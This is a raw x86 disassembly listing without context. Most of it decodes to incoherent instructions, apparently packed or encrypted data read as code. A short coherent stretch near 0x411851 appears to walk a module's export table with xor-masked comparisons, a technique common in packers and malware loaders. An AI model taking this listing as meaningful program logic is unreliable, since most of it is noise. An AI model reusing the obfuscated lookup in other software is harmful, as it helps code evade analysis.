  4111ad:	mov    fs,WORD PTR [ecx-0x7]
  4111b0:	lock mov cs,WORD PTR [ebp+edi*4-0x1d]
  4111b5:	jge    0x41122d
  4111b7:	loope  0x4111e2
  4111b9:	inc    ebx
  4111ba:	pusha  
  4111bb:	in     al,0x9f
  4111bd:	les    ecx,FWORD PTR [edi+0x3]
  4111c0:	pop    edx
  4111c1:	and    DWORD PTR [edx-0x31d61890],ebx
  4111c7:	adc    eax,DWORD PTR [ebp-0x4a]
  4111ca:	xor    al,0xf5
  4111cc:	(bad)  
  4111cd:	cli    
  4111ce:	or     esp,eax
  4111d0:	xchg   ebp,eax
  4111d1:	sbb    ecx,DWORD PTR [eax]
  4111d3:	xor    BYTE PTR [ecx+esi*8],bl
  4111d6:	aas    
  4111d7:	int    0x69
  4111d9:	or     ah,BYTE PTR [ebx+0xc]
  4111dc:	sbb    eax,0x8868b3fa
  4111e1:	je     0x4111da
  4111e3:	mov    ch,BYTE PTR [esi]
  4111e5:	jmp    0x411195
  4111e7:	mov    es,WORD PTR [eax-0x71e9b0a2]
  4111ed:	data16 repnz lods al,BYTE PTR ds:[esi]
  4111f0:	lahf   
  4111f1:	dec    ebp
  4111f2:	lahf   
  4111f3:	js     0x4111b2
  4111f5:	lock pop ds
  4111f7:	shl    BYTE PTR [ecx+esi*4],0x17
  4111fb:	fisubr DWORD PTR [ecx-0x4b]
  4111fe:	ror    BYTE PTR [ecx+ecx*8+0x7131b407],1
  411205:	mov    edx,0xc30f5d1b
  41120a:	xchg   ebp,eax
  41120b:	inc    esi
  41120c:	push   edi
  41120d:	or     DWORD PTR [edi+0x34def628],ecx
  411213:	call   0x9723:0xaeb32d8d
  41121a:	ins    DWORD PTR es:[edi],dx
  41121b:	fcom   DWORD PTR [ebx-0x766368ce]
  411221:	cld    
  411222:	retf   0x9cd
  411225:	add    ebx,DWORD PTR [ebx-0x5a]
  411228:	push   ebp
  411229:	int3   
  41122a:	das    
  41122b:	pop    ebx
  41122c:	(bad)  
  41122d:	sub    ch,BYTE PTR [esi+0xa21aa21]
  411233:	push   ecx
  411234:	xor    dh,BYTE PTR [ecx+ebp*1]
  411237:	cmp    ecx,DWORD PTR [esp+eax*2]
  41123a:	fild   DWORD PTR [ecx+ebp*1]
  41123d:	rcr    dh,1
  41123f:	pushf  
  411240:	fisttp DWORD PTR [esi+0x23]
  411243:	pop    ecx
  411244:	std    
  411245:	xor    ch,dh
  411247:	dec    ecx
  411248:	int3   
  411249:	pop    esp
  41124a:	jbe    0x4111e8
  41124c:	repz daa 
  41124e:	pop    eax
  41124f:	or     eax,0x5535aa3b
  411254:	and    eax,0xeb767fe8
  411259:	ficomp WORD PTR [ecx]
  41125b:	inc    esi
  41125c:	repz xchg edi,eax
  41125e:	lock adc eax,0x68909eeb
  411264:	mov    cl,0x2a
  411266:	test   DWORD PTR [edi+0x7d],ebx
  411269:	das    
  41126a:	add    ah,ch
  41126c:	mov    dl,BYTE PTR [ecx-0x17]
  41126f:	mov    al,ds:0xcccdc597
  411274:	add    al,0x3e
  411276:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411277:	test   eax,0xd8d33cef
  41127c:	nop
  41127d:	imul   esp,edi,0x1d396cc5
  411283:	pop    edx
  411284:	mov    ah,dl
  411286:	(bad)  
  411287:	sbb    BYTE PTR [ebx+0x64],bl
  41128a:	(bad)  
  41128b:	frstor [esi-0x624f5cd5]
  411291:	retf   0x431d
  411294:	loopne 0x41121d
  411296:	jbe    0x411293
  411298:	popa   
  411299:	cs mov ebp,0xb2881a48
  41129f:	pushf  
  4112a0:	mov    ah,0x79
  4112a2:	and    al,0xac
  4112a4:	and    al,BYTE PTR [esi]
  4112a6:	arpl   bx,bp
  4112a8:	sub    al,0xad
  4112aa:	or     cl,BYTE PTR [edi-0x32]
  4112ad:	int    0xf8
  4112af:	add    al,0xc5
  4112b1:	xchg   BYTE PTR [eax],bh
  4112b3:	lods   eax,DWORD PTR ds:[esi]
  4112b4:	sbb    al,BYTE PTR [ebx]
  4112b6:	ret    0xb0e7
  4112b9:	xchg   ecx,eax
  4112ba:	iret   
  4112bb:	dec    edi
  4112bc:	jmp    0x5e5aaacf
  4112c1:	add    DWORD PTR [edi-0x37930366],ebp
  4112c7:	test   eax,0x8a37ce04
  4112cc:	in     al,0x4c
  4112ce:	rol    BYTE PTR [eax],1
  4112d0:	fs jmp 0xa406:0xe9a24626
  4112d8:	xchg   ebp,eax
  4112d9:	push   ds
  4112da:	fstp   TBYTE PTR [esi]
  4112dc:	push   esi
  4112dd:	test   ecx,esp
  4112df:	out    0x82,al
  4112e1:	xchg   esi,eax
  4112e2:	loop   0x411297
  4112e4:	jns    0x4112f7
  4112e6:	dec    dh
  4112e8:	fisubr DWORD PTR [ecx-0x79da3b4f]
  4112ee:	test   eax,ecx
  4112f0:	test   DWORD PTR [esi+eax*4],ebp
  4112f3:	mov    ds:0xf68c52d0,al
  4112f8:	das    
  4112f9:	jno    0x4112ab
  4112fb:	out    dx,eax
  4112fc:	cwde   
  4112fd:	or     DWORD PTR [edi],esi
  4112ff:	sbb    al,0xa4
  411301:	push   esp
  411302:	test   BYTE PTR [edi-0x2b342ebb],ch
  411308:	fwait
  411309:	mov    ebp,esi
  41130b:	xchg   BYTE PTR [edi-0x27],ch
  41130e:	mov    esi,DWORD PTR [ebx+0x4]
  411311:	push   ebp
  411312:	inc    edi
  411313:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411314:	shl    ah,0x34
  411317:	xor    ebx,esi
  411319:	pop    ss
  41131a:	enter  0x7f85,0x8a
  41131e:	dec    esp
  41131f:	nop
  411320:	fimul  WORD PTR [eax-0x49ecae9c]
  411326:	fsub   DWORD PTR [edx]
  411328:	pop    ebp
  411329:	shl    DWORD PTR [ecx],cl
  41132b:	xchg   BYTE PTR [edx*2+0x67f246aa],ch
  411332:	dec    esp
  411333:	repnz mov esi,0xce571be4
  411339:	scas   eax,DWORD PTR es:[edi]
  41133a:	add    ah,bh
  41133c:	repnz ins DWORD PTR es:[edi],dx
  41133e:	adc    al,0xfc
  411340:	sar    DWORD PTR [ebp+0x276206f7],cl
  411346:	xchg   ebx,eax
  411347:	iret   
  411348:	ret    0xb38f
  41134b:	loopne 0x4113b6
  41134d:	mov    cl,0xb6
  41134f:	push   eax
  411350:	add    DWORD PTR [eax+esi*8+0x23fb6344],esi
  411357:	push   ebx
  411358:	nop
  411359:	(bad)  [eax]
  41135b:	mov    al,0xb6
  41135d:	test   eax,0x6995598e
  411362:	in     eax,dx
  411363:	out    0xaf,eax
  411365:	sbb    DWORD PTR [eax],ecx
  411367:	cs test al,0x7f
  41136a:	ja     0x41138d
  41136c:	loope  0x4113b9
  41136e:	in     eax,dx
  41136f:	test   dl,ch
  411371:	xchg   ebp,eax
  411372:	cmp    esi,DWORD PTR [edi]
  411374:	add    bl,BYTE PTR ds:0x2abe3dcf
  41137a:	daa    
  41137b:	arpl   WORD PTR [eax],sp
  41137d:	aam    0x21
  41137f:	xchg   edx,eax
  411380:	mov    edi,0xd2530366
  411385:	xchg   edx,eax
  411386:	mov    ah,0xdc
  411388:	retf   0x89b6
  41138b:	mov    bl,0x56
  41138d:	aam    0xda
  41138f:	lods   eax,DWORD PTR ds:[esi]
  411390:	sub    eax,0x7a34619
  411395:	xchg   esp,eax
  411396:	xor    BYTE PTR [esi-0x52],al
  411399:	xor    DWORD PTR [edi+0x16],esp
  41139c:	int    0x3d
  41139e:	and    DWORD PTR [edx+ebp*8+0x570d9ea8],esp
  4113a5:	loopne 0x41141a
  4113a7:	fdivr  st,st(3)
  4113a9:	adc    DWORD PTR [esi+eax*2],eax
  4113ac:	push   edx
  4113ad:	outs   dx,DWORD PTR ds:[esi]
  4113ae:	(bad)  
  4113af:	nop
  4113b0:	push   edx
  4113b1:	jo     0x41140f
  4113b3:	push   0xffffffa4
  4113b5:	dec    eax
  4113b6:	push   ebp
  4113b7:	pop    edi
  4113b8:	push   ds
  4113b9:	dec    esi
  4113ba:	cmp    al,0x5f
  4113bc:	stos   BYTE PTR es:[edi],al
  4113bd:	sub    bl,BYTE PTR [ecx+0x2e219248]
  4113c3:	jo     0x411440
  4113c5:	inc    esi
  4113c6:	jae    0x4113b6
  4113c8:	jg     0x41136d
  4113ca:	pop    eax
  4113cb:	fadd   QWORD PTR [eax+0x6]
  4113ce:	popf   
  4113cf:	cmp    eax,0x1042bb02
  4113d4:	and    bh,cl
  4113d6:	cmpxchg DWORD PTR [ebp+0x7a],ebp
  4113da:	in     al,0x28
  4113dc:	dec    edi
  4113dd:	xchg   ebp,eax
  4113de:	or     al,0x5
  4113e0:	sbb    eax,0xf09354cd
  4113e5:	pop    esi
  4113e6:	punpckhdq mm3,QWORD PTR [esi-0x3]
  4113ea:	or     al,0xf6
  4113ec:	aad    0x2b
  4113ee:	dec    ecx
  4113ef:	fnstsw WORD PTR [esi+0x16]
  4113f2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4113f3:	in     al,0xbf
  4113f5:	jmp    0xe6b2:0xacd4a53a
  4113fc:	mov    al,0x58
  4113fe:	dec    esi
  4113ff:	hlt    
  411400:	dec    esi
  411401:	mov    edx,0xaa2ff46f
  411406:	sbb    ecx,DWORD PTR [edi]
  411408:	cdq    
  411409:	not    esi
  41140b:	pop    ds
  41140c:	sub    ah,BYTE PTR [edi]
  41140e:	jle    0x411445
  411410:	pushf  
  411411:	and    DWORD PTR [eax-0x99151cc],edi
  411417:	push   edx
  411418:	imul   esi,DWORD PTR [edx+edi*8],0x7d2a1dd
  41141f:	enter  0x1937,0x22
  411423:	arpl   WORD PTR [eax+0x58],bp
  411426:	imul   esp,DWORD PTR [eax+0x27],0x67
  41142a:	cmp    eax,0x164ff971
  41142f:	mov    ds:0x4e7cd9dc,eax
  411434:	mov    esp,0xe60c289d
  411439:	out    dx,eax
  41143a:	scas   eax,DWORD PTR es:[edi]
  41143b:	icebp  
  41143c:	cmp    al,0xbf
  41143e:	jo     0x411405
  411440:	adc    BYTE PTR [edx],0xeb
  411443:	push   ecx
  411444:	dec    esi
  411445:	xchg   ecx,eax
  411446:	jg     0x41145e
  411448:	jmp    0x3c07dbc
  41144d:	or     eax,DWORD PTR [ebp-0x13df89bb]
  411453:	mov    eax,ds:0xcb591a0b
  411458:	popa   
  411459:	pop    ss
  41145a:	pop    ss
  41145b:	cli    
  41145c:	rol    BYTE PTR [edx+eiz*8+0x2b],1
  411460:	push   ebp
  411461:	into   
  411462:	test   BYTE PTR ds:0x1af2bdb6,bl
  411468:	and    al,0x27
  41146a:	out    0x96,al
  41146c:	aas    
  41146d:	push   es
  41146e:	lods   al,BYTE PTR ds:[esi]
  41146f:	or     al,0x72
  411471:	les    esp,FWORD PTR [esi]
  411473:	cmp    DWORD PTR [eax-0x10],0x51
  411477:	and    BYTE PTR [ebp+0x25],dl
  41147a:	xchg   edx,eax
  41147b:	mov    dh,0xa2
  41147d:	adc    DWORD PTR [eax+0x3db538c8],edx
  411483:	popa   
  411484:	mov    dl,0xcf
  411486:	loop   0x4114a9
  411488:	push   eax
  411489:	arpl   WORD PTR [ecx-0x7a440c8a],sp
  41148f:	rol    BYTE PTR [esp+ebp*1+0x35a426f8],0x88
  411497:	bound  edx,QWORD PTR [ecx]
  411499:	mov    esi,0x2cceff05
  41149e:	pop    ss
  41149f:	div    ah
  4114a1:	ins    BYTE PTR es:[edi],dx
  4114a2:	cmp    BYTE PTR [esi-0x8c66a1b],0x73
  4114a9:	mov    eax,0xd2a7ffeb
  4114ae:	out    dx,eax
  4114af:	pop    edx
  4114b0:	dec    ebx
  4114b1:	pop    edx
  4114b2:	mov    edi,0xf5c3b87
  4114b7:	cmp    DWORD PTR [edi-0x6],0x4f37c9bb
  4114be:	push   ebx
  4114bf:	arpl   WORD PTR [edi-0x4f1b2155],ax
  4114c5:	mov    al,0xe
  4114c7:	pusha  
  4114c8:	pop    ebx
  4114ca:	out    dx,eax
  4114cb:	cmp    DWORD PTR [ecx-0x9],ebp
  4114ce:	jmp    0x4114f7
  4114d0:	mov    ecx,edx
  4114d2:	sub    al,0xab
  4114d4:	and    ebp,eax
  4114d6:	les    esp,FWORD PTR [esi-0x6e]
  4114d9:	mov    bl,0x41
  4114db:	loope  0x4114ad
  4114dd:	adc    bh,BYTE PTR [ecx+0x719e15bd]
  4114e3:	stos   BYTE PTR es:[edi],al
  4114e4:	imul   edx,DWORD PTR [edx-0x755d1c37],0xffffffc1
  4114eb:	xchg   ebp,eax
  4114ec:	add    eax,0x846a9e6f
  4114f1:	xchg   ecx,eax
  4114f2:	aas    
  4114f3:	add    al,0x96
  4114f5:	nop
  4114f6:	mov    dl,0xd7
  4114f8:	push   eax
  4114f9:	jne    0x411570
  4114fb:	push   0xffffffd6
  4114fd:	test   BYTE PTR [ecx-0x2a8560fa],al
  411503:	test   DWORD PTR [ebp+0x385e4e4a],ebx
  411509:	sbb    bh,BYTE PTR [ebp+0x8d675a1]
  41150f:	in     eax,dx
  411510:	rol    BYTE PTR [ebx+edi*8+0x69357b7d],0xe0
  411518:	cmp    DWORD PTR [edx],eax
  41151a:	or     eax,0x1dcc270a
  41151f:	xchg   edx,eax
  411520:	ror    DWORD PTR [ecx],1
  411522:	mov    esp,0x89c5032c
  411527:	dec    edi
  411528:	inc    ebx
  411529:	xchg   DWORD PTR ds:0xceeb7a5f,esp
  41152f:	int3   
  411530:	jecxz  0x411527
  411532:	test   al,0x86
  411534:	aam    0x76
  411536:	mov    al,dh
  411538:	imul   esp,ecx,0xe403ba2b
  41153e:	mov    bl,0x26
  411540:	cmp    al,0x26
  411542:	scas   al,BYTE PTR es:[edi]
  411543:	lods   eax,DWORD PTR ds:[esi]
  411544:	jno    0x41153f
  411546:	je     0x411536
  411548:	push   esp
  411549:	or     BYTE PTR ds:0xdc48b63b,0x29
  411550:	into   
  411551:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411552:	fld    TBYTE PTR [ecx]
  411554:	loope  0x411503
  411556:	push   edi
  411557:	scas   eax,DWORD PTR es:[edi]
  411558:	push   esi
  411559:	jns    0x411505
  41155b:	inc    ecx
  41155c:	arpl   WORD PTR [esi],di
  41155e:	mov    gs,ebx
  411560:	fcom   DWORD PTR [ebx-0x3f1f9fc6]
  411566:	fcmovb st,st(4)
  411568:	jns    0x411538
  41156a:	mov    BYTE PTR [esp+ebx*1],dh
  41156d:	and    DWORD PTR [edi],ebp
  41156f:	jge    0x411565
  411571:	mov    eax,ds:0xf5cde26e
  411576:	rol    esi,0x96
  411579:	inc    edx
  41157a:	jg     0x4115d5
  41157c:	adc    ecx,DWORD PTR [ebp-0x43]
  41157f:	fcompp 
  411581:	out    dx,al
  411582:	adc    ecx,DWORD PTR [ebp-0x2f]
  411585:	mov    dh,0x12
  411587:	(bad)  
  411588:	or     ah,0x85
  41158b:	rcr    DWORD PTR [edx-0x13e08aa],cl
  411591:	out    dx,al
  411592:	test   ch,al
  411594:	stos   DWORD PTR es:[edi],eax
  411595:	in     eax,0xac
  411597:	mov    dl,0xf9
  411599:	clc    
  41159a:	add    DWORD PTR [esi-0x30],ebx
  41159d:	lock fdiv QWORD PTR [eax+0x52b2f3b4]
  4115a4:	add    ah,bh
  4115a6:	add    eax,0x7c2d9c14
  4115ab:	mov    ch,0xa4
  4115ad:	out    0xf6,eax
  4115af:	dec    ebx
  4115b0:	nop
  4115b1:	jne    0x411587
  4115b3:	or     BYTE PTR [ebx+0x29225991],bl
  4115b9:	(bad)  
  4115ba:	lods   al,BYTE PTR ds:[esi]
  4115bb:	retf   
  4115bc:	in     eax,0x9c
  4115be:	xlat   BYTE PTR ds:[ebx]
  4115bf:	dec    esi
  4115c0:	ror    DWORD PTR [ebx],1
  4115c2:	adc    esi,DWORD PTR [edx]
  4115c4:	test   eax,0x7faf2e49
  4115c9:	jnp    0x4115ae
  4115cb:	push   eax
  4115cc:	push   esi
  4115cd:	sub    BYTE PTR [ebx],dh
  4115cf:	pop    edi
  4115d0:	sub    DWORD PTR [eax],ebx
  4115d2:	arpl   ax,ax
  4115d4:	add    DWORD PTR [ebx-0x2268f2fa],edi
  4115da:	mov    cs,esp
  4115dc:	gs ds call 0x56240739
  4115e3:	pop    ebp
  4115e4:	popf   
  4115e5:	aas    
  4115e6:	test   al,0x17
  4115e8:	xchg   esp,eax
  4115e9:	jb     0x41161d
  4115eb:	rcl    DWORD PTR es:[edi-0x5fa094dc],cl
  4115f2:	xchg   edx,eax
  4115f3:	sbb    BYTE PTR [edx-0x3],dh
  4115f6:	fidivr DWORD PTR [ebx+0x5c5bf181]
  4115fc:	aaa    
  4115fd:	pop    ebx
  4115fe:	lods   eax,DWORD PTR ds:[esi]
  4115ff:	imul   edx,eax,0xffffff99
  411602:	cmp    dh,BYTE PTR [esi]
  411604:	sbb    BYTE PTR [eax],dh
  411606:	enter  0xcb9c,0x50
  41160a:	xor    edx,eax
  41160c:	jl     0x4115c5
  41160e:	mov    al,ds:0xa572e3b5
  411613:	xor    eax,0x4fea5754
  411619:	fisttp DWORD PTR [esi-0x29]
  41161c:	push   ds
  41161d:	ins    BYTE PTR es:[edi],dx
  41161e:	daa    
  41161f:	mov    ebp,DWORD PTR [ebx+0x6]
  411622:	mov    eax,ds:0x6d6aead
  411627:	adc    edi,DWORD PTR [ebp-0x2dc594a4]
  41162d:	pop    esp
  41162e:	shl    bh,1
  411630:	mov    bh,0xc0
  411632:	mov    ch,BYTE PTR [ecx-0x17]
  411635:	mov    edx,0xc4770995
  41163a:	loop   0x411665
  41163c:	pop    eax
  41163d:	push   0x4d
  41163f:	icebp  
  411640:	enter  0x32fb,0x38
  411644:	jge    0x4115c8
  411646:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411647:	jge    0x41169c
  411649:	and    al,dh
  41164b:	aas    
  41164c:	push   0x6bba0c12
  411651:	scas   al,BYTE PTR es:[edi]
  411652:	arpl   WORD PTR [esi],si
  411654:	mov    al,bl
  411656:	in     eax,0xa9
  411658:	jae    0x4115f4
  41165a:	pusha  
  41165b:	pop    esi
  41165c:	scas   al,BYTE PTR es:[edi]
  41165d:	fdivr  QWORD PTR [ebp+0x71]
  411660:	xchg   ebp,eax
  411661:	bound  esi,QWORD PTR [edx*4-0x14aa541b]
  411668:	jl     0x411666
  41166a:	mov    ebp,0x58307543
  41166f:	mov    esp,0x38d2f7da
  411674:	xor    DWORD PTR [ebx+0x2],esp
  411677:	add    al,0xc0
  411679:	popf   
  41167a:	mov    bh,0xb9
  41167c:	pop    edi
  41167d:	jecxz  0x411665
  41167f:	or     eax,0xa1b46420
  411684:	sbb    DWORD PTR [ebp+0xab44a83],esp
  41168a:	mov    edx,0xedd07263
  41168f:	jge    0x4116f8
  411691:	sbb    DWORD PTR [edx+0x79f86b18],edi
  411697:	xchg   BYTE PTR cs:0x8e17140c,dl
  41169e:	fist   DWORD PTR [edi]
  4116a0:	fcomp  DWORD PTR [eax+0x73]
  4116a3:	into   
  4116a4:	and    BYTE PTR [edi],dh
  4116a6:	push   edi
  4116a7:	in     eax,dx
  4116a8:	int    0x35
  4116aa:	pop    ss
  4116ab:	fst    st(4)
  4116ad:	xor    eax,0xf0a29478
  4116b2:	pop    ebx
  4116b3:	int3   
  4116b4:	cwde   
  4116b5:	and    ecx,DWORD PTR [edi-0x2b268808]
  4116bb:	or     DWORD PTR [esi-0x3dc4b5a3],edx
  4116c1:	loopne 0x4116f7
  4116c3:	sbb    al,0xc7
  4116c5:	cmc    
  4116c6:	add    ecx,esi
  4116c8:	mov    dl,0xca
  4116ca:	or     eax,0x6be608ee
  4116cf:	cmp    eax,0x184872dd
  4116d4:	jne    0x411698
  4116d6:	in     eax,0xd5
  4116d8:	mov    eax,0xef787461
  4116dd:	xor    al,0x6b
  4116df:	jns    0x411670
  4116e1:	dec    eax
  4116e2:	jae    0x411723
  4116e4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4116e5:	sbb    BYTE PTR [ebx],dh
  4116e7:	aad    0x1f
  4116e9:	xor    edx,ebp
  4116eb:	jmp    0x41175f
  4116ed:	sub    DWORD PTR [ecx-0x17],edi
  4116f0:	clc    
  4116f1:	push   0x7dcc3c6e
  4116f6:	pop    ebx
  4116f7:	sub    al,0x99
  4116f9:	add    edx,DWORD PTR [esi+eax*1+0x5e97e094]
  411700:	mov    ecx,0xbeb20c0
  411705:	sti    
  411706:	stos   BYTE PTR es:[edi],al
  411707:	add    DWORD PTR [edi+0x31],edi
  41170a:	lds    esi,FWORD PTR [ecx-0x20]
  41170d:	add    BYTE PTR [ecx+ecx*1-0x595428a1],al
  411714:	inc    ebp
  411715:	sbb    al,0x66
  411717:	mov    bl,0x7a
  411719:	adc    cl,BYTE PTR [edi-0x68]
  41171c:	test   BYTE PTR [eax+0x2771b1d9],dh
  411722:	ds mov esi,0xe4958a50
  411728:	test   esi,ebx
  41172a:	sbb    ch,BYTE PTR [ecx-0x56]
  41172d:	cdq    
  41172e:	sub    DWORD PTR [ebx],ecx
  411730:	stos   BYTE PTR es:[edi],al
  411731:	sub    eax,DWORD PTR [edi+0x1c3e17b7]
  411737:	adc    eax,0xdae3c186
  41173c:	pop    edi
  41173d:	test   al,0x2
  41173f:	mov    ch,0xd3
  411741:	(bad)  
  411742:	adc    al,0xe6
  411744:	setns  bl
  411747:	call   0x8541:0xa8b8d9da
  41174e:	dec    esi
  41174f:	mov    bh,0x62
  411751:	inc    esi
  411752:	mov    dh,BYTE PTR [eax+ebx*2]
  411755:	xlat   BYTE PTR ds:[ebx]
  411756:	arpl   cx,bx
  411758:	loopne 0x41174a
  41175a:	mov    al,0xe9
  41175c:	shl    BYTE PTR [eax+0x74068f9],cl
  411762:	data16 icebp 
  411764:	mov    DWORD PTR [ebp-0x6a98924a],ecx
  41176a:	daa    
  41176b:	neg    DWORD PTR [ebx+ebp*2+0x66]
  41176f:	fsubr  DWORD PTR [ecx+ecx*2+0x7e]
  411773:	push   edx
  411774:	out    0xb5,eax
  411776:	(bad)  [ebx-0x23]
  411779:	and    bl,BYTE PTR [edi+ecx*1+0x309209ce]
  411780:	jmp    0x6fb3137a
  411785:	and    DWORD PTR ds:0xae62d446,0x0
  41178c:	dec    ebp
  41178d:	aam    0x21
  41178f:	cmp    eax,0x6ae42582
  411794:	adc    eax,ecx
  411796:	das    
  411797:	cmp    DWORD PTR [edx+0x6d],ecx
  41179a:	cmp    DWORD PTR [edi+0x2b4eef43],esp
  4117a0:	je     0x4117b0
  4117a2:	fwait
  4117a3:	imul   edx,DWORD PTR ds:0x69fba9d6,0x6602b0bb
  4117ad:	adc    esi,ebx
  4117af:	and    esi,DWORD PTR [ebx+0x4b]
  4117b2:	sahf   
  4117b3:	ret    0x6d76
  4117b6:	ficom  DWORD PTR [ecx+0x33714f33]
  4117bc:	jl     0x411778
  4117be:	mov    ss:0xc6fe7e24,eax
  4117c4:	fsub   QWORD PTR [ebx-0x44]
  4117c7:	rcr    ch,0x66
  4117ca:	mov    bh,0x66
  4117cc:	mov    BYTE PTR fs:[edx],al
  4117cf:	sbb    DWORD PTR [edi],eax
  4117d1:	mov    esp,DWORD PTR [edx-0x79]
  4117d4:	cmp    DWORD PTR [eax],ecx
  4117d6:	mov    dh,0xed
  4117d8:	sbb    DWORD PTR [esi-0x11],0xffffff9a
  4117dc:	dec    ebx
  4117dd:	test   eax,0x366d7ca0
  4117e2:	in     al,0x9d
  4117e4:	cmp    eax,0x2c71c68
  4117e9:	cwde   
  4117ea:	jne    0x411863
  4117ec:	mov    edi,DWORD PTR [esi]
  4117ee:	mov    edi,0x287eb93f
  4117f3:	int3   
  4117f4:	xor    eax,0xcd45fc89
  4117f9:	mov    eax,0xac2ee715
  4117fe:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4117ff:	mov    bl,0x4b
  411801:	mov    ds:0x134c7e2f,eax
  411806:	loop   0x41181a
  411808:	lds    edx,FWORD PTR [esi-0x6b44667a]
  41180e:	daa    
  41180f:	ret    0xd929
  411812:	push   eax
  411813:	test   BYTE PTR [edx-0x64],0xca
  411817:	add    eax,0x80a1e298
  41181c:	push   ecx
  41181d:	idiv   esi
  41181f:	xchg   BYTE PTR [esi+0x24827117],bh
  411825:	js     0x4117ea
  411827:	jns    0x4117cd
  411829:	cmc    
  41182a:	stos   BYTE PTR es:[edi],al
  41182b:	mov    WORD PTR [ecx+0x57c9e7bd],cs
  411831:	ins    DWORD PTR es:[edi],dx
  411832:	mov    al,ds:0xeba39ce5
  411837:	cld    
  411838:	jmp    0xda07:0x4030d74f
  41183f:	sbb    DWORD PTR [ebx],0xfffffff6
  411842:	icebp  
  411843:	sti    
  411844:	mov    cl,0x45
  411846:	je     0x411884
  41184c:	jmp    0x411875
  411851:	mov    eax,DWORD PTR [ebp-0x4]
  411854:	mov    ecx,DWORD PTR [ebp-0x8]
  411857:	xor    eax,esi
  411859:	add    eax,edi
  41185b:	cmp    ecx,eax
  41185d:	mov    eax,DWORD PTR [ebp-0x4]
  411860:	je     0x4118bf
  411866:	mov    ecx,DWORD PTR [ebp-0x30]
  411869:	xor    eax,esi
  41186b:	add    eax,edi
  41186d:	cmp    ecx,eax
  41186f:	je     0x4118c8
  411875:	lea    eax,[ebp-0x8]
  411878:	push   eax
  411879:	push   DWORD PTR [ebp-0x28]
  41187c:	push   DWORD PTR [ebp+0xc]
  41187f:	call   0x416204
  411884:	mov    eax,DWORD PTR [ebp-0x4]
  411887:	mov    ecx,DWORD PTR [ebp-0x8]
  41188a:	xor    eax,esi
  41188c:	add    eax,edi
  41188e:	cmp    ecx,eax
  411890:	je     0x4118ab
  411896:	mov    eax,DWORD PTR [ebp-0x34]
  411899:	movzx  eax,WORD PTR [eax+ebx*2]
  41189d:	mov    ecx,DWORD PTR [ebp-0x14]
  4118a0:	mov    eax,DWORD PTR [ecx+eax*4]
  4118a3:	mov    DWORD PTR [ebp-0x38],eax
  4118a6:	jmp    0x411851
  4118ab:	mov    eax,DWORD PTR [ebp-0xc]
  4118ae:	xor    eax,esi
  4118b0:	lea    ebx,[ebx+eax*1+0x3272ec]
  4118b7:	jmp    0x40f134
  4118bc:	mov    eax,DWORD PTR [ebp-0x4]
  4118bf:	xor    eax,esi
  4118c1:	add    eax,edi
  4118c3:	jmp    0x416111
  4118c8:	mov    eax,DWORD PTR [ebp-0x38]
  4118cb:	add    eax,DWORD PTR [ebp+0x8]
  4118ce:	mov    DWORD PTR [ebp-0x18],eax
  4118d1:	mov    eax,DWORD PTR [ebp-0x1c]
  4118d4:	test   eax,eax
  4118d6:	jmp    0x413c6c
  4118db:	js     0x411873
  4118dd:	jno    0x411933
  4118df:	arpl   WORD PTR [edi+0x68fe867b],dx
  4118e5:	test   DWORD PTR [ebp-0x7f677747],ebx
  4118eb:	dec    ecx
  4118ec:	cmp    DWORD PTR [edx+0x7a],0x5
  4118f0:	pop    edi
  4118f1:	jp     0x41196d
  4118f3:	pop    es
  4118f4:	push   ss
  4118f5:	inc    esp
  4118f6:	sahf   
  4118f7:	inc    ebx
  4118f8:	por    mm1,QWORD PTR [ecx-0x4b]
  4118fc:	mov    BYTE PTR [ecx+eiz*4+0x21],dl
  411900:	sar    BYTE PTR [ebp+0x439f91d0],0xa5
  411907:	xchg   ebp,eax
  411908:	js     0x411989
  41190a:	mov    eax,0xa9b5d388
  41190f:	push   esp
  411910:	sbb    al,0x90
  411912:	cdq    
  411913:	or     DWORD PTR [ebx],edi
  411915:	lock jmp FWORD PTR [eax-0x1b]
  411919:	dec    edx
  41191a:	int    0x56
  41191c:	xchg   BYTE PTR [ecx-0x57],ch
  41191f:	repz je 0x41192e
  411922:	dec    ebp
  411923:	adc    ebx,DWORD PTR [ecx+0x6c]
  411926:	pusha  
  411927:	(bad)  
  411928:	push   ebx
  411929:	xor    eax,0x1f5aa5b5
  41192e:	call   0x19f9de8e
  411933:	jae    0x411984
  411935:	pop    esi
  411936:	jnp    0x4118c5
  411938:	mov    esp,DWORD PTR [edi]
  41193a:	and    edi,DWORD PTR [ecx-0x5]
  41193d:	jbe    0x4118ee
  41193f:	cmp    eax,0x56b31508
  411944:	arpl   WORD PTR [ecx-0x72],bx
  411947:	pop    edi
  411948:	cmp    al,0x16
  41194a:	or     DWORD PTR [ecx+edi*2+0x1f],esi
  41194e:	push   ebp
  41194f:	xor    ebp,0x67dbe8ec
  411955:	xchg   esp,eax
  411956:	(bad)  [ebp+0x1a1ec148]
  41195c:	mov    eax,fs
  41195e:	loope  0x4119b2
  411960:	shr    DWORD PTR [edi-0x15f96049],1
  411966:	fstp   TBYTE PTR [eax]
  411968:	test   DWORD PTR [ebx],edi
  41196a:	cmp    ch,BYTE PTR [ebp+0x2f]
  41196d:	cmc    
  41196e:	idiv   BYTE PTR cs:[ecx+0x1ec00a04]
  411975:	push   es
  411976:	pop    ds
  411977:	pop    DWORD PTR [ebp-0x63834433]
  41197d:	adc    DWORD PTR cs:[esi+0x52],esp
  411981:	scas   eax,DWORD PTR es:[edi]
  411982:	jbe    0x411994
  411984:	test   BYTE PTR [edi+0x5443c9ae],0xa4
  41198b:	das    
  41198c:	test   eax,edi
  41198e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41198f:	loop   0x4119a8
  411991:	jbe    0x411992
  411993:	(bad)  
  411995:	ror    esp,1
  411997:	and    BYTE PTR [eax-0x2dd155a7],ah
  41199d:	icebp  
  41199e:	out    dx,eax
  41199f:	cmp    eax,DWORD PTR [esi+ebx*8-0x7a]
  4119a3:	mov    ah,0xbe
  4119a5:	sub    DWORD PTR [edi+0x51a33831],edx
  4119ab:	stc    
  4119ac:	adc    ebp,ecx
  4119ae:	imul   ebp,DWORD PTR [ecx+0x53],0xffffff94
